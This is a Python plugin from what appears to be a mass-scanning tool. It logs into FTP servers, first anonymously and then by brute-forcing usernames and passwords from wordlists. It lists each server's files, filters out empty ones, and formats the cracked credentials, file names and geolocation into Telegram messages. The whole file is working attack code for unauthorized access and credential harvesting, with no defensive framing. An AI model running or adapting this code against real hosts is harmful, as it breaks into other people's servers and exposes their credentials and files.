import ftplib
import netaddr

from Config import cnf
from lib.plugin.plugins import BasePlugin


class Plugin(BasePlugin):
  class TelegramMessage(BasePlugin.TelegramMessage):
    def _init(self):
      self._name = "FTP"
    
    def _generate(self):
      self.data['txt'] = "ftp://%s:%s@%s/\n" % \
                        (self._host['data']['username'], self._host['data']['password'], self._host['ip'])
      for filename in self._host['data']['files']:
        self.data['txt'] += " + %s\n" % filename
      self.data['txt'] += "Geo: %s/%s\n" % (self._host['data']['geo']['country'], self._host['data']['geo']['city'])
      self.data['txt'] += "#ftp_" + str(int(netaddr.IPAddress(self._host['ip'])))

  class Pipeline(BasePlugin.Pipeline):
    def _init(self):
      self._name = "FTP"

    def run(self):
      try:
        self._connect()
        self._find()
        self._filter()
        self._push()
      except Exception as e:
        self._logger.debug("Error occured: %s (%s)", e, self._host['ip'])
      else:
        self._logger.info("Succeeded for %s" % self._host['ip'])

    def _connect(self):
      self.ftp = ftplib.FTP(host=self._host['ip'], timeout=cnf.stalker.FTP.timeout)
      try:
        self._logger.debug('Trying anonymous login')
        self.ftp.login()
      except ftplib.error_perm:
        pass
      else:
        self._logger.debug('Succeeded with anonymous')
        self._host['data']['username'] = 'anonymous'
        self._host['data']['password'] = ''
        return

      if cnf.stalker.FTP.bruteforce:
        usernames = []
        passwords = []

        with open(cnf.stalker.FTP.logins, 'r') as lfh:
          for username in lfh:
            usernames.append(username.rstrip())
        with open(cnf.stalker.FTP.passwords, 'r') as pfh:
          for password in pfh:
            passwords.append(password.rstrip())
        for username in usernames:
          for password in passwords:
            try:
              self.ftp.voidcmd('NOOP')
            except IOError:
              self.ftp = ftplib.FTP(host=self._host['ip'], timeout=cnf.stalker.FTP.timeout)
            self._logger.debug('Trying %s' % (username + ':' + password))
            try:
              self.ftp.login(username, password)
            except ftplib.error_perm:
              continue
            except:
              raise
            else:
              self._logger.debug('Succeeded with %s' %(username + ':' + password))
              self._host['data']['username'] = username
              self._host['data']['password'] = password
              return
        raise Exception('No matching credentials found')

    def _find(self):
      filelist = self.ftp.nlst()
      try:
        self.ftp.quit()
      except:
        # that's weird, but we don't care
        pass

      try:
        if len(filelist) == 0 or filelist[0] == "total 0":
          raise self.PipelineError("Empty server")
      except IndexError:
        pass

      self._host['data']['files'] = []
      for fileName in filelist:
        self._host['data']['files'].append(fileName)

    def _filter(self):
      self._host['data']['filter'] = False
      if len(self._host['data']['files']) == 0:
        self._host['data']['filter'] = "Empty"
      elif len(self._host['data']['files']) < 6:
        match = 0
        for f in 'incoming', '..', '.ftpquota', '.', 'pub':
          if f in self._host['data']['files']:
            match += 1
          if match == len(self._host['data']['files']):
            self._host['data']['filter'] = "EmptyWithSystemDirs"



